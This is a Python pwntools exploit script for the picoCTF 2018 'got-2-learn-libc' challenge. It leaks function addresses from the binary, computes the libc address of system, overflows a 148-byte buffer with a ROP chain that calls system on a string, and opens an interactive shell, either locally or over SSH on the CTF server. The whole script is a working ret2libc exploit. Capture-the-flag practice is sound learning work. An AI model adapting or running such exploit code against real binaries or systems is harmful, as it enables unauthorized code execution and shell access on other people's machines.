from pwn import *

EXE = 'vuln'
binary = ELF(EXE)

if args.REMOTE:
  conn = ssh(
    host='2018shell2.picoctf.com',
    user='newjam',
    keyfile='id_rsa'
  )
  # get these by doing a dump
  # readelf -s /lib32/libc.so.6 | grep <function>@@GLIBC_2.0
  fflush_offset = 0x0005d330
  system_offset = 0x0003a940
  io = conn.process(EXE, cwd = '/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1')
else:
  io = process('./' + EXE)
  libc = binary.libc
  # in local
  fflush_offset = libc.symbols['fflush']
  system_offset = libc.symbols['system']

# side effect of populating binary.symbols
def get_symbol(name, prefix = None):
  prefix = prefix or name + ': '
  io.recvuntil(prefix)
  address = int(io.recvline().strip(), 16)
  binary.symbols[name] = address
  return address

get_symbol('puts')
fflush = get_symbol('fflush', prefix = 'fflush ')
get_symbol('read')
get_symbol('write')
useful_string = get_symbol('useful_string')

libc_base = fflush - fflush_offset
system = libc_base + system_offset
binary.symbols['system'] = libc_base + system_offset

rop = ROP(binary)
rop.call('system', [useful_string])

BUFSIZE = 148

log.debug(rop.dump())
payload = '_' * (BUFSIZE + 12) + str(rop)
log.debug(io.recvuntil('Enter a string:\n'))
io.sendline(payload)
log.debug(io.readline(keepends=False))
log.debug(io.recvuntil('Thanks! Exiting now...\n'))

# drop into shell :)
log.info('We have a shell :)')
io.interactive()

if args.REMOTE:
  conn.close()

